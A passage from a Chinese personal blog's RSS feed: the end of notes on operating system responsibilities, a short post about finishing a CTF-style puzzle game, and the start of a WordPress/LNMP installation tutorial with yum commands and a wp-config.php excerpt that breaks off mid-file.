&lt;p&gt;操作系统的第二职责是进程管理。进程是运行的程序。进程管理使用调度器和队列来管理进程。进程管理涉及具有不同资源的不同进程间的同步问题。这可能潜在的造成资源死锁和饿死。死锁是指一个进程由于其他进程无限制的使用资源导致无法运行的情况。饿死是指一个进程由于资源分配限制太多而不能执行的情况。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;现代操作系统的第三职责是设备或I/O管理。在计算机系统中，输入/输出设备在数目和速度上都有限制。因为这些折别与CPU和内存相比，速度很慢，所以，当一个进程访问输入/输出设备时，它对其他进程就不可用。设备管理器负责输入/输出设备的高效使用。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;现代操作系统的第四职责是文件管理。操作系统使用文件管理器控制对文件的访问。只有进程或用户被允许访问指定文件时，访问才被允许。访问的类型可以改变。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;具有一些类似性的两个常见的操作系统的UNIX和Linux。UNIX是多用户、多进程、可移植的操作系统，它由四部分构成：内核、命令解释器、一组标准工具和应用程序。Linux由三部分构成：内核、系统工具和系统库。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;微软流行的操作系统家族是Windows。Windows是面向对象的、多层的操作系统。它使用多层，包括硬件抽象层(HAL)、执行层和环境子系统层。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>梦之光芒小游戏通关留念</title>
        <link>https://dorinxl.github.io/p/%E6%A2%A6%E4%B9%8B%E5%85%89%E8%8A%92%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E5%85%B3%E7%95%99%E5%BF%B5/</link>
        <pubDate>Sun, 09 Feb 2020 10:26:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/%E6%A2%A6%E4%B9%8B%E5%85%89%E8%8A%92%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E5%85%B3%E7%95%99%E5%BF%B5/</guid>
        <description>&lt;p&gt;真滴流啤，web逆向杂项隐写还挺全乎的。
位列827名，算是入门了。
&lt;img src=&#34;https://dorinxl.github.io/p/%E6%A2%A6%E4%B9%8B%E5%85%89%E8%8A%92%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E5%85%B3%E7%95%99%E5%BF%B5/1858293-20200209182555349-1257357118.png&#34;
	width=&#34;1588&#34;
	height=&#34;29&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%A2%A6%E4%B9%8B%E5%85%89%E8%8A%92%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E5%85%B3%E7%95%99%E5%BF%B5/1858293-20200209182555349-1257357118_hu7414190787637195455.png 480w, https://dorinxl.github.io/p/%E6%A2%A6%E4%B9%8B%E5%85%89%E8%8A%92%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E5%85%B3%E7%95%99%E5%BF%B5/1858293-20200209182555349-1257357118_hu13751180224077074356.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;5475&#34;
		data-flex-basis=&#34;13142px&#34;
	
&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>搭建WordPress个人博客</title>
        <link>https://dorinxl.github.io/p/%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</link>
        <pubDate>Tue, 04 Feb 2020 15:42:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</guid>
        <description>&lt;h3 id=&#34;1-准备lnmp环境&#34;&gt;1. 准备LNMP环境
&lt;/h3&gt;&lt;h6 id=&#34;lnmp-是-linuxnginxmysql-和-php-的缩写是-wordpress-博客系统依赖的基础运行环境我们先来准备-lnmp-环境&#34;&gt;LNMP 是 Linux、Nginx、MySQL 和 PHP 的缩写，是 WordPress 博客系统依赖的基础运行环境。我们先来准备 LNMP 环境
&lt;/h6&gt;&lt;ul&gt;
&lt;li&gt;
&lt;h5 id=&#34;安装nginx&#34;&gt;安装Nginx
&lt;/h5&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用 &lt;strong&gt;yum&lt;/strong&gt; 安装Nginx：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;yum install nginx -y
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;修改 /etc/nginx/conf.d/default.conf，去除对 IPv6 地址的监听：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;server {
    listen       80 default_server;
    # listen       [::]:80 default_server;
    server_name  _;
    root         /usr/share/nginx/html;

  # Load configuration files for the default server block.
  include /etc/nginx/default.d/*.conf;

    location / {
    }

    error_page 404 /404.html;
        location = /40x.html {
    }

    error_page 500 502 503 504 /50x.html;
        location = /50x.html {
    }

}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;修改完成后，启动Nginx：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nginx
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此时，可访问实验机器外网HTTP服务来确认是否已经安装成功。&lt;/p&gt;
&lt;p&gt;将Nginx设置为开机自动启动：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;chkconfig nginx on
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;h5 id=&#34;安装myaql&#34;&gt;安装MyAQL
&lt;/h5&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用 &lt;strong&gt;yum&lt;/strong&gt; 安装MySQL：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;yum install mysql-server -y
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;安装完成后，启动MySQL服务：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;service mysqld restart
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;设置MySQL账户root密码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/usr/bin/mysqladmin -u root password &#39;此处填密码&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将MySQL设置为开机自动启动:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;chkconfig musqld on
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;h5 id=&#34;安装php&#34;&gt;安装PHP
&lt;/h5&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用 &lt;strong&gt;yum&lt;/strong&gt; 安装PHP：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;yum install php-fpm php-mysql -y
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;安装之后，启动PHP-FPM进程：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;service php-fpm start
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;启动之后，可以使用下面的命令查看PHP-FPM进程监听哪个端口：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;netstat -nlpt | grep php-fpm
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;把PHP-FPM也设置成开机自动启动：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;chkconfig php-fpm on
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;2-安装并配置wordpress&#34;&gt;2. 安装并配置WordPress
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;h5 id=&#34;安装wordpress&#34;&gt;安装WordPress
&lt;/h5&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;配置好LNMP环境后，继续使用&lt;strong&gt;yum&lt;/strong&gt;来安装&lt;strong&gt;WordPress&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;yum install wordpress -y
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;安装成功后，可以在/usr/share/wordpress看到wordpress的原代码了。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;h5 id=&#34;配置数据库&#34;&gt;配置数据库
&lt;/h5&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;进入MySQL:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mysql -uroot --password=’你的密码’
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;为WordPress创建一个数据库：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;CREAT DATABASE wordpress；
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;MySQL部分设置完了，退出MySQL环境：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;exit
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;把上述DB配置同步到word press的配置文件中，可以参考下面的配置：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;102
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;/**&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;The&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;base&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configuration&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WordPress&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;The&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;wp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;creation&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;uses&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;this&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;during&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;the&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;installation&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;You&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;don&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;t have to use the web site, you can&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;copy&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;this&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;wp-config.php&amp;#34;&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fill&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;values&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;This&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;contains&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;following&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configurations&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MySQL&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;settings&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Secret&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;keys&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Database&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;prefix&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ABSPATH&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;link&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;https&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;codex&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordpress&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;org&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Editing_wp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;package&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WordPress&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;**&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MySQL&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;settings&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;You&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;can&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;get&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;this&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;info&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;your&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;web&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;host&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;**&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;/**&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;The&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;database&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WordPress&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;DB_NAME&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;wordpress&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;/**&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MySQL&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;database&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;username&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;DB_USER&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;root&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;/**&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MySQL&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;database&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;DB_PASSWORD&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;MyPas$word4Word_Press&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
